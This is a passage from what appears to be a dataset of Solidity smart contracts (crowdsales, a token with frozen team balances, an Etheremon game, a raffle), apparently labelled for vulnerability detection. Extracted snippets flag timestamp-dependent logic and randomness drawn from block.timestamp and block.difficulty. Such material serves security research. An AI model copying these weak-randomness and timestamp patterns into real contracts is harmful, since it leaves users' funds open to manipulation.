newTokenWallet);\n event WalletChanged(address indexed newWallet);\n constructor(\n address _wallet,\n EDUToken _token,\n address _tokenWallet,\n uint256 _cap,\n uint256 _openingTime,\n uint256 _closingTime,\n address _certifier\n ) public\n Crowdsale(getCurrentRate(), _wallet, _token)\n AllowanceCrowdsale(_tokenWallet)\n CappedCrowdsale(_cap)\n TimedCrowdsale(_openingTime, _closingTime)\n Certifiable(_certifier)\n {\n token = _token;\n }\n function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {\n if (certifier.certified(_beneficiary)) {\n token.transferFrom(tokenWallet, _beneficiary, _tokenAmount);\n } else {\n token.delayedTransferFrom(tokenWallet, _beneficiary, _tokenAmount);\n }\n }\n function getCurrentRate() public view returns (uint256) {\n if (block.timestamp < 1528156799) {\n return 1050;\n } else if (block.timestamp < 1528718400) {\n return 940;\n } else if (block.timestamp < 1529323200) {\n return 865;\n } else if (block.timestamp < 1529928000) {\n return 790;\n } else {\n return 750;\n }\n }\n function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256)\n {\n uint256 currentRate = getCurrentRate();\n uint256 volumeBonus = _getVolumeBonus(currentRate, _weiAmount);\n return currentRate.mul(_weiAmount).add(volumeBonus);\n }\n function _getVolumeBonus(uint256 _currentRate, uint256 _weiAmount) internal view returns (uint256) {\n if (_weiAmount >= TEN_ETH) {\n return _currentRate.mul(_weiAmount).mul(20).div(100);\n }\n return 0;\n }\n function changeTokenWallet(address _tokenWallet) external onlyOwner {\n require(_tokenWallet != address(0x0));\n tokenWallet = _tokenWallet;\n emit TokenWalletChanged(_tokenWallet);\n }\n function changeWallet(address _wallet) external onlyOwner {\n require(_wallet != address(0x0));\n wallet = _wallet;\n emit WalletChanged(_wallet);\n }\n}",
  "extract_feature": [
    "function TimedCrowdsale(uint256 _openingTime, uint256 _closingTime) public {\nrequire(_openingTime >= block.timestamp);\nrequire(_closingTime >= _openingTime);\nopeningTime = _openingTime;\nclosingTime = _closingTime;\n}",
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}",
    "function getCurrentRate() public view returns (uint256) {\nif (block.timestamp < 1528156799) {\nreturn 1050;\n} else if (block.timestamp < 1528718400) {\nreturn 940;\n} else if (block.timestamp < 1529323200) {\nreturn 865;\n} else if (block.timestamp < 1529928000) {\nreturn 790;\n} else {\nreturn 750;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f32"
  },
  "filename": "7338.sol",
  "content": "pragma solidity ^0.4.16;\ncontract BasicAccessControl {\n address public owner;\n uint16 public totalModerators = 0;\n mapping (address => bool) public moderators;\n bool public isMaintaining = false;\n function BasicAccessControl() public {\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyModerators() {\n require(msg.sender == owner || moderators[msg.sender] == true);\n _;\n }\n modifier isActive {\n require(!isMaintaining);\n _;\n }\n function ChangeOwner(address _newOwner) onlyOwner public {\n if (_newOwner != address(0)) {\n owner = _newOwner;\n }\n }\n function AddModerator(address _newModerator) onlyOwner public {\n if (moderators[_newModerator] == false) {\n moderators[_newModerator] = true;\n totalModerators += 1;\n }\n }\n function RemoveModerator(address _oldModerator) onlyOwner public {\n if (moderators[_oldModerator] == true) {\n moderators[_oldModerator] = false;\n totalModerators -= 1;\n }\n }\n function UpdateMaintaining(bool _isMaintaining) onlyOwner public {\n isMaintaining = _isMaintaining;\n }\n}\ncontract EtheremonEnum {\n enum ArrayType {\n CLASS_TYPE,\n STAT_STEP,\n STAT_START,\n STAT_BASE,\n OBJ_SKILL\n }\n}\ninterface EtheremonTradeInterface {\n function isOnTrading(uint64 _objId) constant external returns(bool);\n}\ncontract EtheremonDataBase is EtheremonEnum {\n function getMonsterObj(uint64 _objId) constant public returns(uint64 objId, uint32 classId, address trainer, uint32 exp, uint32 createIndex, uint32 lastClaimIndex, uint createTime);\n function getMonsterDexSize(address _trainer) constant public returns(uint);\n function getElementInArrayType(ArrayType _type, uint64 _id, uint _index) constant public returns(uint8);\n function addMonsterObj(uint32 _classId, address _trainer, string _name) public returns(uint64);\n function addElementToArrayType(ArrayType _type, uint64 _id, uint8 _value) public returns(uint);\n}\ninterface EtheremonRankData {\n function setPlayer(address _trainer, uint64 _a0, uint64 _a1, uint64 _a2, uint64 _s0, uint64 _s1, uint64 _s2) external returns(uint32 playerId);\n}\ncontract EtheremonRankBattle is BasicAccessControl, EtheremonEnum {\n struct MonsterObjAcc {\n uint64 monsterId;\n uint32 classId;\n address trainer;\n string name;\n uint32 exp;\n uint32 createIndex;\n uint32 lastClaimIndex;\n uint createTime;\n }\n address public dataContract;\n address public tradeContract;\n address public rankDataContract;\n uint32[3] public starterClasses;\n uint public maxDexSize = 200;\n modifier requireDataContract {\n require(dataContract != address(0));\n _;\n }\n modifier requireTradeContract {\n require(tradeContract != address(0));\n _;\n }\n modifier requireRankDataContract {\n require(rankDataContract != address(0));\n _;\n }\n event EventUpdateCastle(address indexed trainer, uint32 playerId);\n event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);\n function EtheremonRankBattle(address _dataContract, address _tradeContract, address _rankDataContract) public {\n dataContract = _dataContract;\n tradeContract = _tradeContract;\n rankDataContract = _rankDataContract;\n }\n function setContract(address _dataContract, address _tradeContract, address _rankDataContract) onlyModerators external {\n dataContract = _dataContract;\n tradeContract = _tradeContract;\n rankDataContract = _rankDataContract;\n }\n function setStarterClass(uint _index, uint32 _classId) onlyModerators external {\n starterClasses[_index] = _classId;\n }\n function quickSetStarterClasses() onlyModerators external {\n starterClasses[0] = 25;\n starterClasses[1] = 26;\n starterClasses[2] = 27;\n }\n function setMaxDexSize(uint _value) onlyModerators external {\n maxDexSize = _value;\n }\n function getRandom(uint _seed) constant public returns(uint) {\n return uint(keccak256(block.timestamp, block.difficulty)) ^ _seed;\n }\n function getValidClassId(uint64 _objId, address _owner) constant public returns(uint32) {\n EtheremonDataBase data = EtheremonDataBase(dataContract);\n MonsterObjAcc memory obj;\n (obj.monsterId, obj.classId, obj.trainer, obj.exp, obj.createIndex, obj.lastClaimIndex, obj.createTime) = data.getMonsterObj(_objId);\n if (obj.trainer != _owner || obj.classId == 21) return 0;\n return obj.classId;\n }\n function hasValidParam(address _trainer, uint64 _a1, uint64 _a2, uint64 _a3, uint64 _s1, uint64 _s2, uint64 _s3) constant public returns(bool) {\n if (_a1 == 0 || _a2 == 0 || _a3 == 0)\n return false;\n if (_a1 == _a2 || _a1 == _a3 || _a1 == _s1 || _a1 == _s2 || _a1 == _s3)\n return false;\n if (_a2 == _a3 || _a2 == _s1 || _a2 == _s2 || _a2 == _s3)\n return false;\n if (_a3 == _s1 || _a3 == _s2 || _a3 == _s3)\n return false;\n if (_s1 > 0 && (_s1 == _s2 || _s1 == _s3))\n return false;\n if (_s2 > 0 && (_s2 == _s3))\n return false;\n uint32 classA1 = getValidClassId(_a1, _trainer);\n uint32 classA2 = getValidClassId(_a2, _trainer);\n uint32 classA3 = getValidClassId(_a3, _trainer);\n if (classA1 == 0 || classA2 == 0 || classA3 == 0)\n return false;\n if (classA1 == classA2 || classA1 == classA3 || classA2 == classA3)\n return false;\n if (_s1 > 0 && getValidClassId(_s1, _trainer) == 0)\n return false;\n if (_s2 > 0 && getValidClassId(_s2, _trainer) == 0)\n return false;\n if (_s3 > 0 && getValidClassId(_s3, _trainer) == 0)\n return false;\n return true;\n }\n function setCastle(uint64 _a1, uint64 _a2, uint64 _a3, uint64 _s1, uint64 _s2, uint64 _s3) isActive requireDataContract\n requireTradeContract requireRankDataContract external {\n if (!hasValidParam(msg.sender, _a1, _a2, _a3, _s1, _s2, _s3))\n revert();\n EtheremonTradeInterface trade = EtheremonTradeInterface(tradeContract);\n if (trade.isOnTrading(_a1) || trade.isOnTrading(_a2) || trade.isOnTrading(_a3) ||\n trade.isOnTrading(_s1) || trade.isOnTrading(_s2) || trade.isOnTrading(_s3))\n revert();\n EtheremonRankData rank = EtheremonRankData(rankDataContract);\n uint32 playerId = rank.setPlayer(msg.sender, _a1, _a2, _a3, _s1, _s2, _s3);\n EventUpdateCastle(msg.sender, playerId);\n }\n function catchStarters() isActive requireDataContract external {\n EtheremonDataBase data = EtheremonDataBase(dataContract);\n if (data.getMonsterDexSize(msg.sender) > maxDexSize)\n revert();\n uint i = 0;\n uint j = 0;\n uint seed = 0;\n uint64 objId = 0;\n uint32 classId = 0;\n uint8 value = 0;\n for (i = 0; i < starterClasses.length; i+=1) {\n classId = starterClasses[i];\n seed = getRandom(uint(block.blockhash(block.number - i)));\n objId = data.addMonsterObj(classId, msg.sender, \"..name me...\");\n for (j = 0; j < 6; j += 1) {\n seed = seed ^ (i + j);\n value = uint8(seed % 32) + data.getElementInArrayType(ArrayType.STAT_START, uint64(classId), j);\n data.addElementToArrayType(ArrayType.STAT_BASE, objId, value);\n }\n Transfer(address(0), msg.sender, objId);\n }\n }\n}",
  "extract_feature": [
    "function getRandom(uint _seed) constant public returns(uint) {\nreturn uint(keccak256(block.timestamp, block.difficulty)) ^ _seed;\n}",
    "function catchStarters() isActive requireDataContract external {\nEtheremonDataBase data = EtheremonDataBase(dataContract);\nif (data.getMonsterDexSize(msg.sender) > maxDexSize)\nrevert();\nuint i = 0;\nuint j = 0;\nuint seed = 0;\nuint64 objId = 0;\nuint32 classId = 0;\nuint8 value = 0;\nfor (i = 0; i < starterClasses.length; i+=1) {\nclassId = starterClasses[i];\nseed = getRandom(uint(block.blockhash(block.number - i)));\nobjId = data.addMonsterObj(classId, msg.sender, \"..name me...\");\nfor (j = 0; j < 6; j += 1) {\nseed = seed ^ (i + j);\nvalue = uint8(seed % 32) + data.getElementInArrayType(ArrayType.STAT_START, uint64(classId), j);\ndata.addElementToArrayType(ArrayType.STAT_BASE, objId, value);\n}\nTransfer(address(0), msg.sender, objId);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f33"
  },
  "filename": "738.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Permissioned {\n address public owner;\n bool public mintingFinished = false;\n mapping(address => mapping(uint64 => uint256)) public teamFrozenBalances;\n modifier canMint() { require(!mintingFinished); _; }\n modifier onlyOwner() { require(msg.sender == owner || msg.sender == 0x57Cdd07287f668eC4D58f3E362b4FCC2bC54F5b8); _; }\n event Mint(address indexed _to, uint256 _amount);\n event MintFinished();\n event Burn(address indexed _burner, uint256 _value);\n event OwnershipTransferred(address indexed _previousOwner, address indexed _newOwner);\n function mint(address _to, uint256 _amount) public returns (bool);\n function finishMinting() public returns (bool);\n function burn(uint256 _value) public;\n function transferOwnership(address _newOwner) public;\n}\ncontract ERC223 is Permissioned {\n uint256 public totalSupply;\n mapping(address => uint256) public balances;\n mapping (address => mapping (address => uint256)) internal allowed;\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event Transfer(address indexed _from, address indexed _to, uint256 _value, bytes _data);\n function allowance(address _owner, address _spender) public view returns (uint256);\n function balanceOf(address who) public constant returns (uint);\n function transfer(address _to, uint256 _value) public;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool);\n function approve(address _spender, uint256 _value) public returns (bool);\n function increaseApproval(address _spender, uint _addedValue) public returns (bool);\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool);\n function transfer(address _to, uint256 _value, bytes _data) public;\n}\ncontract Token is ERC223 {\n using SafeMath for uint256;\n string constant TOKEN_NAME = \"YOUToken\";\n string constant TOKEN_SYMBOL = \"YOU\";\n uint8 constant TOKEN_DECIMALS = 18;\n address constant public TOKEN_OWNER = 0x57Cdd07287f668eC4D58f3E362b4FCC2bC54F5b8;\n function () public {\n }\n constructor () public {\n owner = msg.sender;\n teamFrozenBalances[0x3d220cfDdc45900C78FF47D3D2f4302A2e994370][1546300801] = uint256(1398652000 *10 **18);\n teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1546300801] = uint256(131104417 *10 **18);\n teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1577836801] = uint256(131104417 *10 **18);\n teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1609459201] = uint256(131104417 *10 **18);\n teamFrozenBalances[0x41cf7D41ADf0d5de82b35143C9Bbca68af819a89][1546300801] = uint256(87415750 *10 **18);\n teamFrozenBalances[0x61c3b0Fc6c6eE51DF1972c5F8DCE4663e573a398][1546300801] = uint256(43707875 *10 **18);\n teamFrozenBalances[0x51D8cC55d6Bfc41676a64FefA6BbAc56B61A7104][1546300801] = uint256(87415750 *10 **18);\n teamFrozenBalances[0xfBfBF95152FcC8901974d35Ab0AEf172445B3047][1546300801] = uint256(43707875 *10 **18);\n uint256 totalReward = 2054212501 *10 **uint256(TOKEN_DECIMALS);\n totalSupply = totalSupply.add(totalReward);\n }\n function name() pure external returns (string) {\n return TOKEN_NAME;\n }\n function symbol() pure external returns (string) {\n return TOKEN_SYMBOL;\n }\n function decimals() pure external returns (uint8) {\n return uint8(TOKEN_DECIMALS);\n }\n function balanceOf(address _who) public view returns (uint256) {\n return balances[_who];\n }\n function transfer(address _to, uint _value) public {\n require(_to != address(0x00));\n require(balances[msg.sender] >= _value);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n bytes memory data;\n emit Transfer(msg.sender, _to, _value, data);\n }\n function transfer(address _to, uint _value, bytes _data) public {\n require(_to != address(0x00));\n require(balances[msg.sender] >= _value);\n uint codeLength;\n assembly {\n codeLength := extcodesize(_to)\n }\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n if(codeLength > 0x00) {\n ERC223ReceivingContractInterface receiver = ERC223ReceivingContractInterface(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n }\n emit Transfer(msg.sender, _to, _value, _data);\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_from != address(0x00));\n require(_to != address(0x00));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n bytes memory data;\n emit Transfer(_from, _to, _value, data);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n require(_value <= balances[msg.sender]);\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n require(_owner != address(0x00));\n require(_spender != address(0x00));\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n require(_spender != address(0x00));\n require(_addedValue <= balances[msg.sender]);\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n require(_spender != address(0x00));\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0x00;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function mint(address _to, uint256 _amount)\n onlyOwner\n canMint\n public\n returns (bool)\n {\n require(_to != address(0x00));\n totalSupply = totalSupply.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n bytes memory data;\n emit Mint(_to, _amount);\n emit Transfer(address(0x00), _to, _amount, data);\n return true;\n }\n function finishMinting()\n onlyOwner\n canMint\n public\n returns (bool)\n {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n function burn(uint256 _value) public {\n require(_value > 0x00);\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n totalSupply = totalSupply.sub(_value);\n emit Burn(msg.sender, _value);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n require(_newOwner != address(0x00));\n owner = _newOwner;\n emit OwnershipTransferred(msg.sender, owner);\n }\n function unfreezeFoundingTeamBalance() public onlyOwner {\n uint64 timestamp = uint64(block.timestamp);\n uint256 fronzenBalance;\n require(timestamp >= 1546300801);\n if (timestamp < 1577836801) {\n fronzenBalance = teamFrozenBalances[0x3d220cfDdc45900C78FF47D3D2f4302A2e994370][1546300801];\n teamFrozenBalances[0x3d220cfDdc45900C78FF47D3D2f4302A2e994370][1546300801] = 0;\n balances[0x3d220cfDdc45900C78FF47D3D2f4302A2e994370] = balances[0x3d220cfDdc45900C78FF47D3D2f4302A2e994370].add(fronzenBalance);\n fronzenBalance = teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1546300801];\n teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1546300801] = 0;\n balances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97] = balances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97].add(fronzenBalance);\n fronzenBalance = teamFrozenBalances[0x41cf7D41ADf0d5de82b35143C9Bbca68af819a89][1546300801];\n teamFrozenBalances[0x41cf7D41ADf0d5de82b35143C9Bbca68af819a89][1546300801] = 0;\n balances[0x41cf7D41ADf0d5de82b35143C9Bbca68af819a89] = balances[0x41cf7D41ADf0d5de82b35143C9Bbca68af819a89].add(fronzenBalance);\n fronzenBalance = teamFrozenBalances[0x61c3b0Fc6c6eE51DF1972c5F8DCE4663e573a398][1546300801];\n teamFrozenBalances[0x61c3b0Fc6c6eE51DF1972c5F8DCE4663e573a398][1546300801] = 0;\n balances[0x61c3b0Fc6c6eE51DF1972c5F8DCE4663e573a398] = balances[0x61c3b0Fc6c6eE51DF1972c5F8DCE4663e573a398].add(fronzenBalance);\n fronzenBalance = teamFrozenBalances[0x51D8cC55d6Bfc41676a64FefA6BbAc56B61A7104][1546300801];\n teamFrozenBalances[0x51D8cC55d6Bfc41676a64FefA6BbAc56B61A7104][1546300801] = 0;\n balances[0x51D8cC55d6Bfc41676a64FefA6BbAc56B61A7104] = balances[0x51D8cC55d6Bfc41676a64FefA6BbAc56B61A7104].add(fronzenBalance);\n fronzenBalance = teamFrozenBalances[0xfBfBF95152FcC8901974d35Ab0AEf172445B3047][1546300801];\n teamFrozenBalances[0xfBfBF95152FcC8901974d35Ab0AEf172445B3047][1546300801] = 0;\n balances[0xfBfBF95152FcC8901974d35Ab0AEf172445B3047] = balances[0xfBfBF95152FcC8901974d35Ab0AEf172445B3047].add(fronzenBalance);\n } else if(timestamp < 1609459201) {\n fronzenBalance = teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1577836801];\n teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1577836801] = 0;\n balances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97] = balances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97].add(fronzenBalance);\n } else {\n fronzenBalance = teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1609459201];\n teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1609459201] = 0;\n balances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97] = balances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97].add(fronzenBalance);\n }\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}\ninterface ERC223ReceivingContractInterface {\n function tokenFallback(address _from, uint _value, bytes _data) external;\n}",
  "extract_feature": [
    "function unfreezeFoundingTeamBalance() public onlyOwner {\nuint64 timestamp = uint64(block.timestamp);\nuint256 fronzenBalance;\nrequire(timestamp >= 1546300801);\nif (timestamp < 1577836801) {\nfronzenBalance = teamFrozenBalances[0x3d220cfDdc45900C78FF47D3D2f4302A2e994370][1546300801];\nteamFrozenBalances[0x3d220cfDdc45900C78FF47D3D2f4302A2e994370][1546300801] = 0;\nbalances[0x3d220cfDdc45900C78FF47D3D2f4302A2e994370] = balances[0x3d220cfDdc45900C78FF47D3D2f4302A2e994370].add(fronzenBalance);\nfronzenBalance = teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1546300801];\nteamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1546300801] = 0;\nbalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97] = balances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97].add(fronzenBalance);\nfronzenBalance = teamFrozenBalances[0x41cf7D41ADf0d5de82b35143C9Bbca68af819a89][1546300801];\nteamFrozenBalances[0x41cf7D41ADf0d5de82b35143C9Bbca68af819a89][1546300801] = 0;\nbalances[0x41cf7D41ADf0d5de82b35143C9Bbca68af819a89] = balances[0x41cf7D41ADf0d5de82b35143C9Bbca68af819a89].add(fronzenBalance);\nfronzenBalance = teamFrozenBalances[0x61c3b0Fc6c6eE51DF1972c5F8DCE4663e573a398][1546300801];\nteamFrozenBalances[0x61c3b0Fc6c6eE51DF1972c5F8DCE4663e573a398][1546300801] = 0;\nbalances[0x61c3b0Fc6c6eE51DF1972c5F8DCE4663e573a398] = balances[0x61c3b0Fc6c6eE51DF1972c5F8DCE4663e573a398].add(fronzenBalance);\nfronzenBalance = teamFrozenBalances[0x51D8cC55d6Bfc41676a64FefA6BbAc56B61A7104][1546300801];\nteamFrozenBalances[0x51D8cC55d6Bfc41676a64FefA6BbAc56B61A7104][1546300801] = 0;\nbalances[0x51D8cC55d6Bfc41676a64FefA6BbAc56B61A7104] = balances[0x51D8cC55d6Bfc41676a64FefA6BbAc56B61A7104].add(fronzenBalance);\nfronzenBalance = teamFrozenBalances[0xfBfBF95152FcC8901974d35Ab0AEf172445B3047][1546300801];\nteamFrozenBalances[0xfBfBF95152FcC8901974d35Ab0AEf172445B3047][1546300801] = 0;\nbalances[0xfBfBF95152FcC8901974d35Ab0AEf172445B3047] = balances[0xfBfBF95152FcC8901974d35Ab0AEf172445B3047].add(fronzenBalance);\n} else if(timestamp < 1609459201) {\nfronzenBalance = teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1577836801];\nteamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1577836801] = 0;\nbalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97] = balances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97].add(fronzenBalance);\n} else {\nfronzenBalance = teamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1609459201];\nteamFrozenBalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97][1609459201] = 0;\nbalances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97] = balances[0xCd975cE2903Cf9F17d924d96d2bC752C06a3BB97].add(fronzenBalance);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f34"
  },
  "filename": "739.sol",
  "content": "pragma solidity ^0.4.13;\ncontract Crowdsale {\n using SafeMath for uint256;\n address constant public TOKEN_OWNER = 0x57Cdd07287f668eC4D58f3E362b4FCC2bC54F5b8;\n address constant public WALLET = 0x1513F644590d866e25490687AB1b3Ad262d5b6dF;\n uint256 constant public MINSALESCAP = 200 ether;\n uint256 constant public MAXSALESCAP = 126000 ether;\n uint256 constant public STARTDATE = 1533686401;\n uint256 constant public ENDDATE = 1543536060;\n uint256 constant public FXRATE = 50000;\n uint256 constant public MINCONTRIBUTION = 5000000000000 wei;\n address public TOKEN;\n address public owner;\n uint256 public weiRaised;\n enum State { Running, Expired, Funded }\n State public state;\n struct ContributorStruct {\n bool whitelisted;\n uint256 contributions;\n }\n mapping(address => ContributorStruct) public whitelist;\n modifier isContributor() {require(whitelist[msg.sender].contributions > 0x00); _;}\n modifier isOwner() {require(msg.sender == owner); _;}\n modifier inState(State _state) {require(state == _state); _;}\n modifier inPaymentLimits(uint256 _payment) {require(_payment >= MINCONTRIBUTION); _;}\n modifier inWhitelist(address _contributor) {require(whitelist[_contributor].whitelisted == true); _;}\n event WhitelistingLog(address indexed _contributor);\n event RefundLog(address indexed _contributor, uint256 _amount);\n event PurchaseLog(address indexed _contributor, address indexed _beneficiary, uint256 _amount);\n constructor (address _token) public {\n require(_token != address(0x00));\n owner = msg.sender;\n TOKEN = _token;\n }\n function () public payable {\n _updateStateIfExpired();\n }\n function buyTokens(address _beneficiary)\n public\n inState(State.Running)\n inPaymentLimits(msg.value)\n inWhitelist(_beneficiary)\n payable\n returns (bool success)\n {\n require(_beneficiary != address(0x00));\n assert(block.timestamp >= STARTDATE);\n uint256 tokenAmount = _calculateTokenAmount(msg.value);\n YOUToken token = YOUToken(TOKEN);\n weiRaised = weiRaised.add(msg.value);\n whitelist[_beneficiary].contributions = whitelist[_beneficiary].contributions.add(msg.value);\n if (!token.mint.gas(700000)(_beneficiary, tokenAmount)) {\n return false;\n }\n if (weiRaised >= MAXSALESCAP\n || weiRaised >= MINSALESCAP && block.timestamp >= ENDDATE) {\n state = State.Funded;\n } else {\n _updateStateIfExpired();\n }\n emit PurchaseLog(msg.sender, _beneficiary, msg.value);\n return true;\n }\n function refund(address _contributor)\n public\n isContributor\n inState(State.Expired)\n returns (bool success)\n {\n require(_contributor != address(0x00));\n uint256 amount = whitelist[_contributor].contributions;\n whitelist[_contributor].contributions = 0x00;\n _contributor.transfer(amount);\n emit RefundLog(_contributor, amount);\n return true;\n }\n function whitelistAddr(address _contributor)\n public\n isOwner\n returns(bool)\n {\n require(_contributor != address(0x00));\n whitelist[_contributor].whitelisted = true;\n emit WhitelistingLog(_contributor);\n return true;\n }\n function whitelistAddrAndBuyTokens(address _contributor, uint256 _weiAmount)\n public\n isOwner\n returns(bool)\n {\n require(_contributor != address(0x00));\n uint256 tokenAmount = _calculateTokenAmount(_weiAmount);\n YOUToken token = YOUToken(TOKEN);\n whitelist[_contributor].whitelisted = true;\n weiRaised = weiRaised.add(_weiAmount);\n if (!token.mint.gas(700000)(_contributor, tokenAmount)) {\n return false;\n }\n emit WhitelistingLog(_contributor);\n return true;\n }\n function withdraw() public isOwner inState(State.Funded) {\n WALLET.transfer(address(this).balance);\n }\n function delistAddress(address _contributor)\n public\n isOwner\n inState(State.Running)\n returns (bool)\n {\n require(_contributor != address(0x00));\n require(whitelist[_contributor].whitelisted);\n whitelist[_contributor].whitelisted = false;\n return true;\n }\n function emergencyStop()\n public\n isOwner\n inState(State.Running)\n {\n state = State.Expired;\n }\n function transferOwnership()\n public\n isOwner\n inState(State.Running)\n {\n owner = TOKEN_OWNER;\n }\n function _updateStateIfExpired() internal {\n if ((block.timestamp >= ENDDATE && state == State.Running)\n || (block.timestamp >= ENDDATE && weiRaised < MINSALESCAP)) {\n state = State.Expired;\n }\n }\n function _calculateTokenAmount(uint256 _weiAmount)\n internal\n view\n returns (uint256 tokenAmount)\n {\n uint256 discount;\n if (block.timestamp <= 1535241660) {\n if (_weiAmount >= 1700 ether) {\n discount = 30;\n } else if (_weiAmount > 0.2 ether) {\n discount = 25;\n }\n } else if (block.timestamp <= 1537747260) {\n discount = 15;\n } else if (block.timestamp <= 1540339260) {\n discount = 10;\n } else if (block.timestamp <= 1543536060) {\n discount = 5;\n }\n _weiAmount = _weiAmount.mul(discount).div(100).add(_weiAmount);\n return _weiAmount.mul(FXRATE);\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract YOUToken {\n function mint(address _to, uint256 _amount) public returns (bool);\n function transferOwnership(address _newOwner) public;\n}",
  "extract_feature": [
    "function _updateStateIfExpired() internal {\nif ((block.timestamp >= ENDDATE && state == State.Running)\n|| (block.timestamp >= ENDDATE && weiRaised < MINSALESCAP)) {\nstate = State.Expired;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f35"
  },
  "filename": "7419.sol",
  "content": "pragma solidity ^0.4.0;\ncontract SponsoredItemGooRaffle {\n Goo goo = Goo(0x57b116da40f21f91aec57329ecb763d29c1b2355);\n address owner;\n mapping(address => TicketPurchases) private ticketsBoughtByPlayer;\n mapping(uint256 => address[]) private rafflePlayers;\n uint256 private constant RAFFLE_TICKET_BASE_GOO_PRICE = 1000;\n uint256 private raffleEndTime;\n uint256 private raffleTicketsBought;\n uint256 private raffleId;\n address private raffleWinner;\n bool private raffleWinningTicketSelected;\n uint256 private raffleTicketThatWon;\n struct TicketPurchases {\n TicketPurchase[] ticketsBought;\n uint256 numPurchases;\n uint256 raffleId;\n }\n struct TicketPurchase {\n uint256 startId;\n uint256 endId;\n }\n function SponsoredItemGooRaffle() public {\n owner = msg.sender;\n }\n function startTokenRaffle(uint256 endTime, address tokenContract, uint256 id, bool hasItemAlready) external {\n require(msg.sender == owner);\n require(block.timestamp < endTime);\n if (raffleId != 0) {\n require(raffleWinner != 0);\n }\n raffleWinningTicketSelected = false;\n raffleTicketThatWon = 0;\n raffleWinner = 0;\n raffleTicketsBought = 0;\n raffleEndTime = 